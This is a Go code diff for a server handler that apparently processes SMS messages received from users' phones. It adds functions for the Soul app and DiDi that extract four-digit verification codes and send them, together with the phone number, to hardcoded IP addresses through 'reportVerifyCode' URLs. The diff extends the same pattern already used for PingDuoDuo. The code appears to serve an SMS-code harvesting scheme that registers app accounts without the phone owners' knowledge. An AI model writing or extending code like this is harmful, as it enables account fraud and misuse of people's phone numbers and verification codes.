@@ -104,6 +104,10 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 				processTanTanRegister(msg, *user, r.FormValue("apid"))
 			} else if strings.EqualFold(r.FormValue("apid"), "118") {
 				processPingDuoDuoRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "119") {
+				processSoulAppRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "120") {
+				processDiDiRegister(msg, *user, r.FormValue("apid"))
 			}
 		}
 	}
@@ -231,6 +235,32 @@ func processPingDuoDuoRegister(msg string, user map[string]string, apid string) 
 		log.Println(result[0])
 		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
 		url := "http://47.106.253.197:9800/lsapi/channel/reportVerifyCode?cpid=24423809118f4db0a3f0a5bb7b27eac3&telephone=" + mobile + "&smsContent=" + result[0]
+		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
+		go send2Url(url)
+		go updateRelationSuccess(user, apid)
+	}
+}
+func processDiDiRegister(msg string, user map[string]string, apid string) {
+	mobile := formatMobile(user["mobile"])
+	exp := regexp.MustCompile(`\d{4}`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[0])
+		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
+		url := "http://112.74.183.43:9802/lsapi/channel/reportVerifyCode?cpid=f009aa0be9d94432a29813abe7ca9d5c&telephone=" + mobile + "&smsContent=" + result[0]
+		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
+		go send2Url(url)
+		go updateRelationSuccess(user, apid)
+	}
+}
+func processSoulAppRegister(msg string, user map[string]string, apid string) {
+	mobile := formatMobile(user["mobile"])
+	exp := regexp.MustCompile(`\d{4}`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[0])
+		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
+		url := "http://121.201.67.189:9876/verifycode/api/getWYYCode.jsp?cid=c159&pid=wyy159&&mobile=" + mobile + "&smsContent=" + result[0]
 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
 		go send2Url(url)
 		go updateRelationSuccess(user, apid)
